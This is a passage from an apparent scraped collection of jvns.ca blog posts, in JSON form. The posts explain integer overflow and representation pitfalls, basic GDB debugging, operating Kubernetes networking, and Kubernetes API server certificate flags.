50 bajillion configuration\noperations in order to accomplish what I want. \n\n But so far the documentation is pretty good, when there are things that\naren’t documented the code is pretty easy to read, and they seem really\nwilling to review pull requests. \n\n I’ve definitely had to practice “read the documentation and if it’s not\nthere read the code” more than usual. But that’s a good skill to get\nbetter at anyway! \n\n"},
{"url": "https://jvns.ca/blog/2023/01/18/examples-of-problems-with-integers/", "title": "Examples of problems with integers", "content": "\n     \n\n Hello! A few days back we talked about  problems with floating point numbers . \n\n This got me thinking – but what about integers? Of course integers have all\nkinds of problems too – anytime you represent a number in a small fixed amount of\nspace (like 8/16/32/64 bits), you’re going to run into problems. \n\n So I  asked on Mastodon again  for examples of integer problems and got all kinds of great responses again. Here’s a table of contents. \n\n example 1: the small database primary key \n example 2: integer overflow/underflow \n aside: how do computers represent negative integers? \n example 3: decoding a binary format in Java \n example 4: misinterpreting an IP address or string as an integer \n example 5: security problems because of integer overflow \n example 6: the case of the mystery byte order \n example 7: modulo of negative numbers \n example 8: compilers removing integer overflow checks \n example 9: the && typo \n\n Like last time, I’ve written some example programs to demonstrate these\nproblems. I’ve tried to use a variety of languages in the examples (Go,\nJavascript, Java, and C) to show that these problems don’t just show up in\nsuper low level C programs – integers are everywhere! \n\n Also I’ve probably made some mistakes in here, I learned several things while writing this. \n\n example 1: the small database primary key \n\n One of the most classic (and most painful!) integer problems is: \n\n \n You create a database table where the primary key is a 32-bit unsigned integer, thinking “4 billion rows should be enough for anyone!” \n You are massively successful and eventually, your table gets close to 4 billion rows \n oh no! \n You need to do a database migration to switch your primary key to be a 64-bit integer instead \n \n\n If the primary key actually reaches its maximum value I’m not sure exactly what\nhappens, I’d imagine you wouldn’t be able to create any new database rows and\nit would be a very bad day for your massively successful service. \n\n example 2: integer overflow/underflow \n\n Here’s a Go program: \n\n package main\n\nimport \"fmt\"\n\nfunc main() {\n\tvar x uint32 = 5\n\tvar length uint32 = 0\n\tif x < length-1 {\n\t\tfmt.Printf(\"%d is less than %d\\n\", x, length-1)\n\t}\n}\n \n\n This slightly mysteriously prints out: \n\n 5 is less than 4294967295\n \n\n That true, but it’s not what you might have expected. \n\n what’s going on? \n\n 0 - 1  is equal to the 4 bytes  0xFFFFFFFF . \n\n There are 2 ways to interpret those 4 bytes: \n\n \n As a  signed  integer (-1) \n As an  unsigned  integer (4294967295) \n \n\n Go here is treating  length - 1  as a  unsigned  integer, because we defined  x  and  length  as uint32s (the “u” is for “unsigned”). So it’s testing if 5 is less than 4294967295, which it is! \n\n what do we do about it? \n\n I’m not actually sure if there’s any way to automatically detect integer overflow errors in Go. (though it looks like there’s a  github issue from 2019 with some discussion ) \n\n Some brief notes about other languages: \n\n \n Lots of languages (Python, Java, Ruby) don’t have unsigned integers at all, so this specific problem doesn’t come up \n In C, you can compile with  clang -fsanitize=unsigned-integer-overflow . Then if your code has an overflow/underflow like this, the program will crash. \n Similarly in Rust, if you compile your program in debug mode it’ll crash if there’s an integer overflow. But in release mode it won’t crash, it’ll just happily decide that 0 - 1 = 4294967295. \n \n\n The reason Rust doesn’t check for overflows if you compile your program in\nrelease mode (and the reason C and Go don’t check) is that – these checks are\nexpensive! Integer arithmetic is a very big part of many computations, and\nmaking sure that every single addition isn’t overflowing makes it slower. \n\n aside: how do computers represent negative integers? \n\n I mentioned in the last section that  0xFFFFFFFF  can mean either  -1  or\n 4294967295 . You might be thinking – what??? Why would  0xFFFFFFFF  mean  -1 ? \n\n So let’s talk about how computers represent negative integers for a second. \n\n I’m going to simplify and talk about 8-bit integers instead of 32-bit integers,\nbecause there are less of them and it works basically the same way. \n\n You can represent 256 different numbers with an 8-bit integer: 0 to 255 \n\n 00000000 -> 0\n00000001 -> 1\n00000010 -> 2\n...\n11111111 -> 255\n \n\n But what if you want to represent  negative  integers? We still only have 8\nbits! So we need to reassign some of these and treat them as negative numbers\ninstead. \n\n Here’s the way most modern computers do it: \n\n \n Every number that’s 128 or more becomes a negative number instead \n How to know  which  negative number it is: take the positive integer you’d expect it to be, and then subtract 256 \n \n\n So 255 becomes -1, 128 becomes -128, and 200 becomes -56. \n\n Here are some maps of bits to numbers: \n\n 00000000 -> 0\n00000001 -> 1\n00000010 -> 2\n01111111 -> 127\n10000000 -> -128 (previously 128)\n10000001 -> -127 (previously 129)\n10000010 -> -126 (previously 130)\n...\n11111111 -> -1 (previously 255)\n \n\n This gives us 256 numbers, from -128 to 127. \n\n And  11111111  (or  0xFF , or 255) is -1. \n\n For 32 bit integers, it’s the same story, except it’s “every number larger than 2^31 becomes negative” and “subtract 2^32”. And similarly for other integer sizes. \n\n That’s how we end up with  0xFFFFFFFF  meaning -1. \n\n there are multiple ways to represent negative integers \n\n The way we just talked about of representing negative integers (“it’s the equivalent positive integer, but you subtract 2^n”) is called\n two’s complement , and it’s the most common on modern computers. There are several other ways\nthough, the  wikipedia article has a list . \n\n weird thing: the absolute value of -128 is negative \n\n This  Go program  has a pretty simple  abs()  function that computes the absolute value of an integer: \n\n package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc abs(x int8) int8 {\n\tif x < 0 {\n\t\treturn -x\n\t}\n\treturn x\n}\n\nfunc main() {\n\tfmt.Println(abs(-127))\n\tfmt.Println(abs(-128))\n}\n \n\n This prints out: \n\n 127\n-128\n \n\n This is because the signed 8-bit integers go from -128 to 127 – there  is  no +128!\nSome programs might crash when you try to do this (it’s an overflow), but Go\ndoesn’t. \n\n Now that we’ve talked about signed integers a bunch, let’s dig into another example of how they can cause problems. \n\n example 3: decoding a binary format in Java \n\n Let’s say you’re parsing a binary format in Java, and you want to get the first\n4 bits of the byte  0x90 . The correct answer is 9. \n\n public class Main {\n    public static void main(String[] args) {\n        byte b = (byte) 0x90;\n        System.out.println(b >> 4);\n    }\n}\n \n\n This prints out “-7”. That’s not right! \n\n what’s going on? \n\n There are two things we need to know about Java to make sense of this: \n\n \n Java doesn’t have unsigned integers. \n Java can’t right shift bytes, it can only shift integers. So anytime you shift a byte, it has to be promoted into an integer. \n \n\n Let’s break down what those two facts mean for our little calculation  b >> 4 : \n\n \n In bits,  0x90  is  10010000 . This starts with a 1, which means that it’s more than 128, which means it’s a negative number \n Java sees the  >>  and decides to promote  0x90  to an integer, so that it can shift it \n The way you convert a negative byte to an 32-bit integer is to add a bunch of  1 s at the beginning. So now our 32-bit integer is  0xFFFFFF90  ( F  being 15, or  1111 ) \n Now we right shift ( b >> 4 ). By default, Java does a  signed shift , which means that it adds 0s to the beginning if it’s positive, and 1s to the beginning if it’s negative. ( >>>  is an unsigned  shift in Java) \n We end up with  0xFFFFFFF9  (having cut off the last 4 bits and added more 1s at the beginning) \n As a signed integer, that’s -7! \n \n\n what can you do about it? \n\n I don’t the actual idiomatic way to do this in Java is, but the way I’d naively\napproach fixing this is to put in a bit mask before doing the right shift. So\ninstead of: \n\n b >> 4\n \n\n we’d write \n\n (b & 0xFF) >> 4\n \n\n b & 0xFF  seems redundant ( b  is already a byte!), but it’s actually not because  b  is being promoted to an integer. \n\n Now instead of  0x90 -> 0xFFFFFF90 -> 0xFFFFFFF9 , we end up calculating  0x90 -> 0xFFFFFF90 -> 0x00000090 -> 0x00000009 , which is the result we wanted: 9. \n\n And when we actually try it, it prints out “9”. \n\n Also, if we were using a language with unsigned integers, the natural way to\ndeal with this would be to treat the value as an unsigned integer in the first\nplace. But that’s not possible in Java. \n\n example 4: misinterpreting an IP address or string as an integer \n\n I don’t know if this is technically a “problem with integers” but it’s funny\nso I’ll mention it:  Rachel by the bay  has a bunch of great\nexamples of things that are not integers being interpreted as integers. For\nexample, “HTTP” is  0x48545450  and  2130706433  is  127.0.0.1 . \n\n She points out that you can actually ping any integer, and it’ll convert that integer into an IP address, for example: \n\n $ ping 2130706433\nPING 2130706433 (127.0.0.1): 56 data bytes\n$ ping 132848123841239999988888888888234234234234234234\nPING 132848123841239999988888888888234234234234234234 (251.164.101.122): 56 data bytes\n \n\n (I’m not actually sure how ping is parsing that second integer or why ping accepts these giant larger-than-2^64-integers as valid inputs, but it’s a fun weird thing) \n\n example 5: security problems because of integer overflow \n\n Another integer overflow example: here’s a  search for CVEs involving integer overflows .\nThere are a lot! I’m not a security person, but here’s one random example: this  json parsing library bug \n\n My understanding of that json parsing bug is roughly: \n\n \n you load a JSON file that’s 3GB or something, or 3,000,000,000 \n due to an integer overflow, the code allocates close to 0 bytes of memory instead of ~3GB amount of memory \n but the JSON file is still 3GB, so it gets copied into the tiny buffer with almost 0 bytes of memory \n this overwrites all kinds of other memory that it’s not supposed to \n \n\n The CVE says “This vulnerability mostly impacts process availability”, which I\nthink means “the program crashes”, but sometimes this kind of thing is much\nworse and can result in arbitrary code execution. \n\n My impression is that there are a large variety of different flavours of\nsecurity vulnerabilities caused by integer overflows. \n\n example 6: the case of the mystery byte order \n\n One person said that they’re do scientific computing and sometimes they need to\nread files which contain data with an unknown byte order. \n\n Let’s invent a small example of this: say you’re reading a file which contains 4\nbytes -  00 ,  00 ,  12 , and  81  (in that order), that you happen to know\nrepresent a 4-byte integer. There are 2 ways to interpret that integer: \n\n \n 0x00001281  (which translates to 4737). This order is called “big endian” \n 0x81120000  (which translates to 2165440512). This order is called “little endian”. \n \n\n Which one is it? Well, maybe the file contains some metadata that specifies the\nendianness. Or maybe you happen to know what machine it was generated on and\nwhat byte order that machine uses. Or maybe you just read a bunch of values,\ntry both orders, and figure out which makes more sense. Maybe 2165440512 is too\nbig to make sense in the context of whatever your data is supposed to mean, or\nmaybe  4737  is too small. \n\n A couple more notes on this: \n\n \n this isn’t just a problem with integers, floating point numbers have byte\norder too \n this also comes up when reading data from a network, but in that case the\nbyte order isn’t a “mystery”, it’s just going to be big endian. But x86\nmachines (and many others) are little endian, so you have to swap the byte\norder of all your numbers. \n \n\n example 7: modulo of negative numbers \n\n This is more of a design decision about how different programming languages design their math libraries, but it’s still a little weird and lots of people mentioned it. \n\n Let’s say you write  -13 % 3  in your program, or  13 % -3 . What’s the result? \n\n It turns out that different programming languages do it differently, for\nexample in Python  -13 % 3 = 2  but in Javascript  -13 % 3 = -1 . \n\n There’s a table in  this blog post  that\ndescribes a bunch of different programming languages’ choices. \n\n example 8: compilers removing integer overflow checks \n\n We’ve been hearing a lot about integer overflow and why it’s bad. So let’s\nimagine you try to be safe and include some checks in your programs – after\neach addition, you make sure that the calculation didn’t overflow. Like this: \n\n #include <stdio.h>\n\n#define INT_MAX 2147483647\n\nint check_overflow(int n) {\n    n = n + 100;\n    if (n + 100 < 0)\n        return -1;\n    return 0;\n}\n\nint main() {\n    int result = check_overflow(INT_MAX);\n    printf(\"%d\\n\", result);\n}\n \n\n check_overflow  here should return  -1  (failure), because  INT_MAX + 100  is more than the maximum integer size. \n\n $ gcc  check_overflow.c  -o check_overflow && ./check_overflow\n-1 \n$ gcc -O3 check_overflow.c  -o check_overflow && ./check_overflow\n0\n \n\n That’s weird – when we compile with  gcc , we get the answer we expected, but\nwith  gcc -O3 , we get a different answer. Why? \n\n what’s going on? \n\n My understanding (which might be wrong) is: \n\n \n Signed integer overflow in C is  undefined behavior . I think that’s\nbecause different C implementations might be using different representations\nof signed integers (maybe they’re using one’s complement instead of two’s\ncomplement or something) \n “undefined behaviour” in C means “the compiler is free to do literally whatever it wants after that point”  (see this post  With undefined behaviour, anything is possible  by Raph Levine for a lot more) \n Some compiler optimizations assume that undefined behaviour will never\nhappen. They’re free to do this, because – if that undefined behaviour\n did  happen, then they’re allowed to do whatever they want, so “run the\ncode that I optimized assuming that this would never happen” is fine. \n So this  if (n + 100 < 0)  check is irrelevant – if that did\nhappen, it would be undefined behaviour, so there’s no need to execute the\ncontents of that if statement. \n \n\n So, that’s weird. I’m not going to write a “what can you do about it?” section here because I’m pretty out of my depth already. \n\n I certainly would not have expected that though. \n\n My impression is that “undefined behaviour” is really a C/C++ concept, and\ndoesn’t exist in other languages in the same way except in the case of “your\nprogram called some C code in an incorrect way and that C code did something\nweird because of undefined behaviour”. Which of course happens all the time. \n\n example 9: the && typo \n\n This one was mentioned as a very upsetting bug. Let’s say you have two integers\nand you want to check that they’re both nonzero. \n\n In Javascript, you might write: \n\n if a && b {\n    /* some code */\n}\n \n\n But you could also make a typo and type: \n\n if a & b {\n    /* some code */\n}\n \n\n This is still perfectly valid code, but it means something completely different\n– it’s a bitwise and instead of a boolean and. Let’s go into a Javascript\nconsole and look at bitwise vs boolean and for  9  and  4 : \n\n > 9 && 4\n4\n> 9 & 4\n0\n> 4 && 5\n5\n> 4 & 5\n4\n \n\n It’s easy to imagine this turning into a REALLY annoying bug since it would be\nintermittent – often  x & y  does turn out to be truthy if  x && y  is truthy. \n\n what to do about it? \n\n For Javascript, ESLint has a  no-bitwise check  check), which\nrequires you manually flag “no, I actually know what I’m doing, I want to do\nbitwise and” if you use a bitwise and in your code. I’m sure many other linters\nhave a similar check. \n\n that’s all for now! \n\n There are definitely more problems with integers than this, but this got pretty\nlong again and I’m tired of writing again so I’m going to stop :) \n\n"},
{"url": "https://jvns.ca/blog/2014/02/10/three-steps-to-learning-gdb/", "title": "Three steps to learning GDB", "content": "\n      Debugging C programs used to scare me a lot. Then I was writing my\n operating system  and I had so\nmany bugs to debug! I was extremely fortunate to be using the emulator\nqemu, which lets me attach a debugger to my operating system. The\ndebugger is called  gdb . \n\n I’m going to explain a couple of small things you can do with  gdb ,\nbecause I found it really confusing to get started. We’re going to set\na breakpoint and examine some memory in a tiny program. \n\n \n\n 1. Set breakpoints \n\n If you’ve ever used a debugger before, you’ve probably set a\nbreakpoint. \n\n Here’s the program that we’re going to be “debugging” (though there\naren’t any bugs): \n\n #include <stdio.h>\nvoid do_thing() {\n    printf(\"Hi!\\n\");\n}\nint main() {\n    do_thing();\n}\n \n\n Save this as  hello.c . We can debug it with gdb like this: \n\n \nbork@kiwi ~> gcc -g hello.c -o hello\nbork@kiwi ~> cat\nbork@kiwi ~> gdb ./hello\n \n\n This compiles  hello.c  with debugging symbols (so that gdb can do\nbetter work), and gives us kind of scary prompt that just says \n\n (gdb) \n\n We can then set a breakpoint using the  break  command, and then  run \nthe program. \n\n \n(gdb) break do_thing \nBreakpoint 1 at 0x4004f8\n(gdb) run\nStarting program: /home/bork/hello \n\nBreakpoint 1, 0x00000000004004f8 in do_thing ()\n \n\n This stops the program at the beginning of  do_thing . \n\n We can find out where we are in the call stack with  where : (thanks\nto  @mgedmin  for the tip) \n\n \n(gdb) where\n#0  do_thing () at hello.c:3\n#1  0x08050cdb in main () at hello.c:6\n(gdb) \n \n\n 2. Look at some assembly code \n\n We can look at the assembly code for our function using the\n disassemble  command! This is cool. This is x86 assembly. I don’t\nunderstand it very well, but the line that says  callq  is what does\nthe  printf  function call. \n\n \n(gdb) disassemble do_thing\nDump of assembler code for function do_thing:\n   0x00000000004004f4 <+0>:     push   %rbp\n   0x00000000004004f5 <+1>:     mov    %rsp,%rbp\n=> 0x00000000004004f8 <+4>:     mov    $0x40060c,%edi\n   0x00000000004004fd <+9>:     callq  0x4003f0  \n   0x0000000000400502 <+14>:    pop    %rbp\n   0x0000000000400503 <+15>:    retq \n \n\n You can also shorten  disassemble  to  disas \n\n 3. Examine some memory! \n\n The main thing I used  gdb  for when I was debugging my kernel was to\nexamine regions of memory to make sure they were what I thought they\nwere. The command for examining memory is  examine , or  x  for short.\nWe’re going to use  x . \n\n From looking at that assembly above, it seems like  0x40060c  might be\nthe address of the string we’re printing. Let’s check! \n\n \n(gdb) x/s 0x40060c\n0x40060c:        \"Hi!\"\n \n\n It is! Neat! Look at that. The  /s  part of  x/s  means “show it to me\nlike it’s a string”. I could also have said “show me 10 characters”\nlike this: \n\n \n(gdb) x/10c 0x40060c\n0x40060c:       72 'H'  105 'i' 33 '!'  0 '\\000'        1 '\\001'        27 '\\033'       3 '\\003'        59 ';'\n0x400614:       52 '4'  0 '\\000'\n \n\n You can see that the first four characters are ‘H’, ‘i’, and ‘!’, and\n‘\\0’ and then after that there’s more unrelated stuff. \n\n I know that gdb does lots of other stuff, but I still don’t know it\nvery well and  x  and  break  got me pretty far. You can read the\n documentation for examining memory . \n"},
{"url": "https://jvns.ca/blog/2017/10/10/operating-a-kubernetes-network/", "title": "Operating a Kubernetes network", "content": "\n     \n\n I’ve been working on Kubernetes networking a lot recently. One thing I’ve noticed is, while there’s\na reasonable amount written about how to  set up  your Kubernetes network, I haven’t seen much\nabout how to  operate  your network and be confident that it won’t create a lot of production\nincidents for you down the line. \n\n In this post I’m going to try to convince you of three things: (all I think pretty reasonable :)) \n\n \n Avoiding networking outages in production is important \n Operating networking software is hard \n It’s worth thinking critically about major changes to your networking infrastructure and the impact that will have on your reliability, even if very fancy Googlers say “this is what we do at Google”. (google engineers are doing great work on Kubernetes!! But I think it’s important to still look at the architecture and make sure it makes sense for your organization.) \n \n\n I’m definitely not a Kubernetes networking expert by any means, but I have run into a few issues while setting things up and definitely know a LOT more about Kubernetes networking than I used to. \n\n Operating networking software is hard \n\n Here I’m not talking about operating physical networks (I don’t know anything about that), but\ninstead about keeping software like DNS servers & load balancers & proxies working correctly. \n\n I have been working on a team that’s responsible for a lot of networking infrastructure for a year, and I have learned a few things about operating networking infrastructure! (though I still have a lot to learn obviously). 3 overall thoughts before we start: \n\n \n Networking software often relies very heavily on the Linux kernel. So in addition to configuring the software correctly you also need to make sure that a bunch of different sysctls are set correctly, and a misconfigured sysctl can easily be the difference between “everything is 100% fine” and “everything is on fire”. \n Networking requirements change over time (for example maybe you’re doing 5x more DNS lookups than you were last year! Maybe your DNS server suddenly started returning TCP DNS responses instead of UDP which is a totally different kernel workload!). This means software that was working fine before can suddenly start having issues. \n To fix a production networking issues you often need a lot of expertise. (for example see this  great post by Sophie Haskins on debugging a kube-dns issue ) I’m a lot better at debugging networking issues than I was, but that’s only after spending a huge amount of time investing in my knowledge of Linux networking. \n \n\n I am still far from an expert at networking operations but I think it seems important to: \n\n \n Very rarely make major changes to the production networking infrastructure (because it’s super disruptive) \n When you  are  making major changes, think really carefully about what the failure modes are for the new network architecture are \n Have multiple people who are able to understand your networking setup \n \n\n Switching to Kubernetes is obviously a pretty major networking change! So let’s talk about what some of the things that can go wrong are! \n\n Kubernetes networking components \n\n The Kubernetes networking components we’re going to talk about in this post are: \n\n \n Your overlay network backend (like flannel/calico/weave net/romana) \n kube-dns \n kube-proxy \n Ingress controllers / load balancers \n The  kubelet \n \n\n If you’re going to set up HTTP services you probably need all of these. I’m not using most of these components yet but I’m trying to understand them, so that’s what this post is about. \n\n The simplest way: Use host networking for all your containers \n\n Let’s start with the simplest possible thing you can do. This won’t let you run HTTP services in Kubernetes. I think it’s pretty safe because there are less moving parts. \n\n If you use host networking for all your containers I think all you need to do is: \n\n \n Configure the kubelet to configure DNS correctly inside your containers \n That’s it \n \n\n If you use host networking for literally every pod you don’t need kube-dns or kube-proxy. You don’t even need a working overlay network. \n\n In this setup your pods can connect to the outside world (the same way any process on your hosts would talk to the outside world) but the outside world can’t connect to your pods. \n\n This isn’t super important (I think most people want to run HTTP services inside Kubernetes and actually communicate with those services) but I do think it’s interesting to realize that at some level all of this networking complexity isn’t strictly required and sometimes you can get away without using it. Avoiding networking complexity seems like a good idea to me if you can. \n\n Operating an overlay network \n\n The first networking component we’re going to talk about is your overlay network. Kubernetes assumes that every pod has an IP address and that you can communicate with services inside that pod by using that IP address. When I say “overlay network” this is what I mean (“the system that lets you refer to a pod by its IP address”). \n\n All other Kubernetes networking stuff relies on the overlay networking working correctly. You can read more about the  kubernetes networking model here . \n\n The way Kelsey Hightower describes in  kubernetes the hard way  seems pretty good but it’s not really viable on AWS for clusters more than 50 nodes or so, so I’m not going to talk about that. \n\n There are a lot of overlay network backends (calico, flannel, weaveworks, romana) and the landscape is pretty confusing. But as far as I’m concerned an overlay network has 2 responsibilities: \n\n \n Make sure your pods can send network requests outside your cluster \n Keep a stable mapping of nodes to subnets and keep every node in your cluster updated with that mapping. Do the right thing when nodes are added & removed. \n \n\n Okay! So! What can go wrong with your overlay network? \n\n \n The overlay network is responsible for setting up iptables rules (basically  iptables -A -t nat POSTROUTING -s $SUBNET -j MASQUERADE ) to ensure that containers can make network requests outside Kubernetes. If something goes wrong with this rule then your containers can’t connect to the external network. This isn’t that hard (it’s just a few iptables rules) but it is important. I made a  pull request  because I wanted to make sure this was resilient \n Something can go wrong with adding or deleting nodes. We’re using the flannel hostgw backend and at the time we started using it, node deletion  did not work . \n Your overlay network is probably dependent on a distributed database (etcd). If that database has an incident, this can cause issues. For example  https://github.com/coreos/flannel/issues/610  says that if you have data loss in your flannel etcd cluster it can result in containers losing network connectivity. (this has now been fixed) \n You upgrade Docker and everything breaks \n Probably more things! \n \n\n I’m mostly talking about past issues in Flannel here but I promise I’m not picking on Flannel – I actually really  like  Flannel because I feel like it’s relatively simple (for instance the  vxlan backend part of it  is like 500 lines of code) and I feel like it’s possible for me to reason through any issues with it. And it’s obviously continuously improving. They’ve been great about reviewing pull requests. \n\n My approach to operating an overlay network so far has been: \n\n \n Learn how it works in detail and how to debug it (for example the hostgw network backend for Flannel works by creating routes, so you mostly just need to do  sudo ip route list  to see whether it’s doing the correct thing) \n Maintain an internal build so it’s easy to patch it if needed \n When there are issues, contribute patches upstream \n \n\n I think it’s actually really useful to go through the list of merged PRs and see bugs that have been\nfixed in the past – it’s a bit time consuming but is a great way to get a concrete list of kinds of\nissues other people have run into. \n\n It’s possible that for other people their overlay networks just work but that hasn’t been my\nexperience and I’ve heard other folks report similar issues. If you have an overlay network setup\nthat is a) on AWS and b) works on a cluster more than 50-100 nodes where you feel more confident\nabout operating it I would like to know. \n\n Operating kube-proxy and kube-dns? \n\n Now that we have some thoughts about operating overlay networks, let’s talk about \n\n There’s a question mark next to this one because I haven’t done this. Here I have more questions than answers. \n\n Here’s how Kubernetes services work! A service is a collection of pods, which each have their own IP address (like 10.1.0.3, 10.2.3.5, 10.3.5.6) \n\n \n Every Kubernetes service gets an IP address (like 10.23.1.2) \n kube-dns  resolves Kubernetes service DNS names to IP addresses (so my-svc.my-namespace.svc.cluster.local might map to 10.23.1.2) \n kube-proxy  sets up iptables rules in order to do random load balancing between them. Kube-proxy also has a userspace round-robin load balancer but my impression is that they don’t recommend using it. \n \n\n So when you make a request to  my-svc.my-namespace.svc.cluster.local , it resolves to 10.23.1.2, and then iptables rules on your local host (generated by kube-proxy) redirect it to one of 10.1.0.3 or 10.2.3.5 or 10.3.5.6 at random. \n\n Some things that I can imagine going wrong with this: \n\n \n kube-dns  is misconfigured \n kube-proxy  dies and your iptables rules don’t get updated \n Some issue related to maintaining a large number of iptables rules \n \n\n Let’s talk about the iptables rules a bit, since doing load balancing by creating a bajillion\niptables rules is something I had never heard of before! \n\n kube-proxy creates one iptables rule per target host like this: (these rules are from  this github issue ) \n\n -A KUBE-SVC-LI77LBOOMGYET5US -m comment --comment \"default/showreadiness:showreadiness\" -m statistic --mode random --probability 0.20000000019 -j KUBE-SEP-E4QKA7SLJRFZZ2DD[b][c]  \n-A KUBE-SVC-LI77LBOOMGYET5US -m comment --comment \"default/showreadiness:showreadiness\" -m statistic --mode random --probability 0.25000000000 -j KUBE-SEP-LZ7EGMG4DRXMY26H  \n-A KUBE-SVC-LI77LBOOMGYET5US -m comment --comment \"default/showreadiness:showreadiness\" -m statistic --mode random --probability 0.33332999982 -j KUBE-SEP-RKIFTWKKG3OHTTMI  \n-A KUBE-SVC-LI77LBOOMGYET5US -m comment --comment \"default/showreadiness:showreadiness\" -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-CGDKBCNM24SZWCMS \n-A KUBE-SVC-LI77LBOOMGYET5US -m comment --comment \"default/showreadiness:showreadiness\" -j KUBE-SEP-RI4SRNQQXWSTGE2Y \n \n\n So kube-proxy creates a  lot  of iptables rules. What does that mean? What are the implications of that in for my network? There’s a great talk from Huawei called  Scale Kubernetes to Support 50,000 services  that says if you have 5,000 services in your kubernetes cluster, it takes  11 minutes  to add a new rule. If that happened to your real cluster I think it would be very bad. \n\n I definitely don’t have 5,000 services in my cluster, but 5,000 isn’t SUCH a bit number. The\nproposal they give to solve this problem is to replace this iptables backend for kube-proxy with\nIPVS which is a load balancer that lives in the Linux kernel. \n\n It seems like kube-proxy is going in the direction of various Linux kernel based load balancers. I\nthink this is partly because they support UDP load balancing, and other load balancers (like\nHAProxy) don’t support UDP load balancing. \n\n But I feel comfortable with HAProxy! Is it possible to replace kube-proxy with HAProxy!  I googled this and I found this  thread on kubernetes-sig-network  saying: \n\n \n kube-proxy is so awesome, we have used in production for almost a year, it works well most of time, but as we have more and more services in our cluster, we found it was getting hard to debug and maintain. There is no iptables expert in our team, we do have HAProxy&LVS experts, as we have used these for several years, so we decided to replace this distributed proxy with a centralized HAProxy. I think this maybe useful for some other people who are considering using HAProxy with kubernetes, so we just update this  project and make it open source:  https://github.com/AdoHe/kube2haproxy . If you found it’s useful , please take a look and give a try. \n \n\n So that’s an interesting option! I definitely don’t have answers here, but, some thoughts: \n\n \n Load balancers are complicated \n DNS is also complicated \n If you already have a lot of experience operating one kind of load balancer (like HAProxy), it might make sense to do some extra work to use that instead of starting to use an entirely new kind of load balancer (like kube-proxy) \n I’ve been thinking about where we want to be using kube-proxy or kube-dns at all – I think instead it might be better to just invest in Envoy and rely entirely on Envoy for all load balancing & service discovery. So then you just need to be good at operating Envoy. \n \n\n As you can see my thoughts on how to operate your Kubernetes internal proxies are still pretty confused and I’m still not super experienced with them. It’s totally possible that kube-proxy and kube-dns are fine and that they will just work fine but I still find it helpful to think through what some of the implications of using them are (for example “you can’t have 5,000 Kubernetes services”). \n\n Ingress \n\n If you’re running a Kubernetes cluster, it’s pretty likely that you actually need HTTP requests to\nget into your cluster so far. This blog post is already too long and I don’t know much about ingress\nyet so we’re not going to talk about that. \n\n Useful links \n\n A couple of useful links, to summarize: \n\n \n The Kubernetes networking model \n How GKE networking works:   https://www.youtube.com/watch?v=y2bhV81MfKQ \n The aforementioned talk on  kube-proxy  performance:  https://www.youtube.com/watch?v=4-pawkiazEg \n \n\n I think networking operations is important \n\n My sense of all this Kubernetes networking software is that it’s all still quite new and I’m not\nsure we (as a community) really know how to operate all of it well. This makes me worried as an\noperator because I really want my network to keep working! :) Also I feel like as an organization\nrunning your own Kubernetes cluster you need to make a pretty large investment into making sure you\nunderstand all the pieces so that you can fix things when they break. Which isn’t a bad thing, it’s\njust a thing. \n\n My plan right now is just to keep learning about how things work and reduce the number of moving\nparts I need to worry about as much as possible. \n\n As usual I hope this was helpful and I would very much like to know what I got wrong in this post! \n\n"},
{"url": "https://jvns.ca/blog/2017/08/05/how-kubernetes-certificates-work/", "title": "How Kubernetes certificate authorities work", "content": "\n     \n\n Today, let’s talk about Kubernetes private/public keys & certificate authorities! \n\n This blog post is about how to take your own requirements about how certificate\nauthorities + private keys should be organized and set up your Kubernetes\ncluster the way you need to. \n\n The various Kubernetes components have a TON of different places where\nyou can put in a certificate/certificate authority. When we were setting up a\ncluster I felt like there were like 10 billion different command line arguments\nfor certificates and keys and certificate authorities and I didn’t understand\nhow they all fit together. \n\n There are not actually 10 billion command line arguments but there are quite a lot. For example! Let’s just look at the command line arguments to the API server. \n\n The API server has more than 16 different command line arguments to do with\ncertificates or keys (I actually deleted a bunch to cut it down to this\nlist). \n\n --cert-dir string                           The directory where the TLS certs are located. If --tls-cert-file and --tls-private-key-file are provided, this flag will be ignored. (default \"/var/run/kubernetes\")\n--client-ca-file string                     If set, any request presenting a client certificate signed by one of the authorities in the client-ca-file is authenticated with an identity corresponding to the CommonName of the client certificate.\n--etcd-certfile string                      SSL certification file used to secure etcd communication.\n--etcd-keyfile string                       SSL key file used to secure etcd communication.\n--etcd-cafile string                        SSL Certificate Authority file used to secure etcd communication.\n--kubelet-certificate-authority string      Path to a cert file for the certificate authority.\n--kubelet-client-certificate string         Path to a client cert file for TLS.\n--kubelet-client-key string                 Path to a client key file for TLS.\n--proxy-client-cert-file string             Client certificate used to prove the identity of the aggregator or kube-apiserver when it must call out during a request. This includes proxying requests to a user api-server and calling out to webhook admission plugins. It is expected that this cert includes a signature from the CA in the --requestheader-client-ca-file flag. That CA is published in the 'extension-apiserver-authentication' configmap in the kube-system namespace. Components recieving calls from kube-aggregator should use that CA to perform their half of the mutual TLS verification.\n--proxy-client-key-file string              Private key for the client certificate used to prove the identity of the aggregator or kube-apiserver when it must call out during a request. This includes proxying requests to a user api-server and calling out to webhook admission plugins.\n--requestheader-allowed-names stringSlice   List of client certificate common names to allow to provide usernames in headers specified by --requestheader-username-headers. If empty, any client certificate validated by the authorities in --requestheader-client-ca-file is allowed.\n--requestheader-client-ca-file string       Root certificate bundle to use to verify client certificates on incoming requests before trusting usernames in headers specified by --requestheader-username-headers\n--service-account-key-file stringArray      File containing PEM-encoded x509 RSA or ECDSA private or public keys, used to verify ServiceAccount tokens. If unspecified, --tls-private-key-file is used. The specified file can contain multiple keys, and the flag can be specified multiple times with different files.\n--ssh-keyfile string                        If non-empty, use secure SSH proxy to the nodes, using this user keyfile\n--tls-ca-file string                        If set, this certificate authority will used for secure access from Admission Controllers. This must be a valid PEM-encoded CA bundle. Alternatively, the certificate authority can be appended to the certificate provided by --tls-cert-file.\n--tls-cert-file string                      File containing the default x509 Certificate for HTTPS. (CA cert, if any, concatenated after server cert). If HTTPS serving is enabled, and --tls-cert-file and --tls-private-key-file are not provided, a self-signed certificate and key are generated for the public address and saved to /var/run/kubernetes.\n--tls-private-key-file string               File containing the default x509 private key matching --tls-cert-file.\n--tls-sni-cert-key namedCertKey             A pair of x509 certificate and private key file paths, optionally suffixed with a list of domain patterns which are fully qualified domain names, possibly with prefixed wildcard segments. If no domain patterns are provided, the names of the certificate are extracted. Non-wildcard matches trump over wildcard matches, explicit domain patterns trump over extracted names. For multiple key/certificate pairs, use the --tls-sni-cert-key multiple times. Examples: 